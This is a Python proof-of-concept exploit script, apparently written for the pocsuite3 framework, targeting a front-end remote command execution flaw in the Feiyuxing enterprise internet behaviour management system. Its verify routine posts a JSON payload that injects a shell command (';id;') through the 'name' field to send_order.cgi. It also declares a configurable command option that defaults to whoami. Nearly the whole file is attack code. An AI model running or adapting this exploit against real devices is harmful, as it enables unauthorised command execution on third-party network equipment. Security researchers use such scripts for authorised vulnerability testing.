# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = "2024"
    createDate = "2024-3-21"
    updateDate = "2024-3-21"
    references =[]
    name ="飞鱼星企业级智能上网行为管理系统"
    appPowerLink = ''
    appName = '飞鱼星企业级智能上网行为管理系统'
    appVersion = ''
    vulType = '前台RCE'
    desc = '''
    前台RCE
    '''
    


    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        #os.environ["http_proxy"] = "http://127.0.0.1:8080"
        #os.environ["https_proxy"] = "https://127.0.0.1:8080"
        result ={}
        urlparts = self.url
        parts = urlparts.split('/')
        urlresult = '/'.join(parts[:3])
        url = str(urlresult) + '/send_order.cgi?parameter=operation'
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'*/*',
                    }
        payload = '''{"opid":"1","name":";id;","type":"rest"}'''
        r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
        try:
            if r.status_code == 200 and 'ok' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result = {}
        return self.parse_output(result)
        
register_poc(DemoPOC) 
